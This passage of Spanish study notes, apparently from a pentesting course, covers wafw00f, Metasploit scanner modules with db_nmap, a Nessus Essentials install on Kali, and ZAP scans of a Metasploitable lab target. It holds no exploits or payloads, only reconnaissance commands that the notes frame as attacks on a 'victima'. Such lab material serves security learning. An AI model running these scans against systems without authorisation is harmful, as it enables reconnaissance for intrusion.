			- `wafw00f {domain-name}` - [EnableSecurity/wafw00f](https://github.com/EnableSecurity/wafw00f)
- [Metasploit-framework](https://github.com/rapid7/metasploit-framework) | [Docs](https://docs.metasploit.com)
	- Herramienta Open-Source para explotar vulnerabilidades
		- Ejemplo de uso
			- `msfconsole`: Abrir la consola
			- `use auxiliary/scanner/http/http_version`: Cargar modulo auxiliar
			- `show options`: Ver opciones disponibles y parametros configurados
			- `set rhosts {domain-name-full}`: Configurar Host
			- `run`: Ejecutar el modo configurado
		- [Database Workspace Attack](https://www.offsec.com/metasploit-unleashed/using-databases/)
			- `service postgresql start`: Iniciar base de datos
			- `msfdb init`: Iniciar una base de datos
			- `msfconsole -q`: Conectar msf a la base de datos
			- `workspace -a company`: Crear un espacio de trabajo
			- `db_nmap {ip-kali}`: Revisa puertos abiertos
			- `services`: Lista de servicios disponibles
			- `db_nmap {ip-kali} -sV`: Revisa puertos abiertos en detalle
			- `services`: Guarda mas informacion de los servicios
			- `db_nmap {ip-externo} -sV`
			- `hosts`: Listar servidores atacados
			- `services -p {port}`: Listar uso puerto de los hosts
			- `use auxiliary/scanner/smb/smb_version`
			- `show options`: Ver opcion y parametros
			- `set rhosts {ip-kali}`: Marcar victima
			- `show options`: Informacion extraida de hosts para el ataque
			- `run`: Ejecutar ataque
			- `services -p 445`: Actualizacion informacion de samba

## Evaluacion de Vulnerabilidades
> [!IMPORTANT] Importante
> Esta instalacion toma 1 hora en compilarse, cuidado con el tiempo

> [!WARNING] Peligro
> Puedes conseguir la licencia OFFLINE con la ayuda de la pagina de [nessus](https://plugins.nessus.org/v2/offline.php) y esta [guia](https://community.tenable.com/s/article/How-to-configure-a-new-install-of-Nessus-from-the-command-line) la cual usa `nessuscli` el cual esta en el directorio `/opt/nessus/sbin/`, no recomiendo este metodo.

> [!IMPORTANT] Importante
> Kali debes configurarlo con la maxima configuracion de CPU, RAM y Storage (SSD + I/O Anfitrion), ademas de habilitar ambos tick de paravirtualizacion ([Guia Aqui](https://stackoverflow.com/questions/54251855/virtualbox-enable-nested-vtx-amd-v-greyed-out)), de esta forma la compilacion se demorara menos.

Iniciar Maquina [Kali](https://www.kali.org/) Actualizada (2024.3)

- `sudo su`: Ser root
- `setxkbmap -layout latam`
- `apt-get update && apt-get upgrade`
- Descargar [Nessus](https://www.tenable.com/downloads/nessus) (10.8.3) para "Linux - Ubuntu - AMD64" o con el link en curl desde el VM
```
curl --request GET --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.8.3-ubuntu1604_amd64.deb' --output 'Nessus-10.8.3-ubuntu1604_amd64.deb'
```
- Consigue una licencia gratuita por iniciar sesion para [Nessus Essentials](https://www.tenable.com/products/nessus/nessus-essentials) , necesitas tu correo institucional debido a que es dirigido a la [educacion](https://www.tenable.com/tenable-for-education)
- `dpkg -i {nessus.deb}`: Instala nessus
- `systemctl enable --now nessusd`: Inicia Nessus, incluyendo despues de reiniciar la maquina
- conectarse a la ip `https://kali:8384` para ver la interfaz de nessus
- Simplemente selecciona siguiente sin marcar ninguna opcion
- Cuando salga el menu de opciones, marca "`Nessus Essentials`"
- Pon un "Nombre" y "Apellido", y el correo puedes omitirlo, debido a que posiblemente envie un error, dar en "`skip`"
- Luego pon tu clave de activacion ONLINE, que te llego al correo al iniciar sesion en Nessus
- Crea un usuario `admin` o `kali` con alguna contraseña segura y presiona en "Submit"
- Se empezara a compilar los plugins, es el paso final de la instalacion, se demora aproximadamente 45 minutos en completar con las optimizaciones
- Luego que se compilen los plugins, se instalar, esto toma 5 minutos, saldra un mensaje de "Finalizo la instalacion de plugins" y podras analizar 16 IPs
- Analiza la IP de Kali y anota alguna algunas de sus vulnerabilidades usando [CVE](https://www.cve.org/), [CVSS](https://www.cvedetails.com/) o [EPSS](https://www.first.org/epss/)

**Usar [zaproxy](https://www.kali.org/tools/zaproxy/) via Kali**
- Inicia Kali en modo adaptador de red "Red NAT"
- Iniciar `owasp-zap` desde el menu kali
- selecciona la primera opcion la primera vez que lo abras "`Yes, i want to persist this session with name based on the current timestamp`"
- Ingresa la siguiente IP modificando {ip-metasploitable} por la ip de metasploit
- `http://{ip-metasploitable}/multillidae/index.php?page=user-info.php`
- Una vez finalize el analisis, te dara un reporte de las vulnerabilidades reportadas
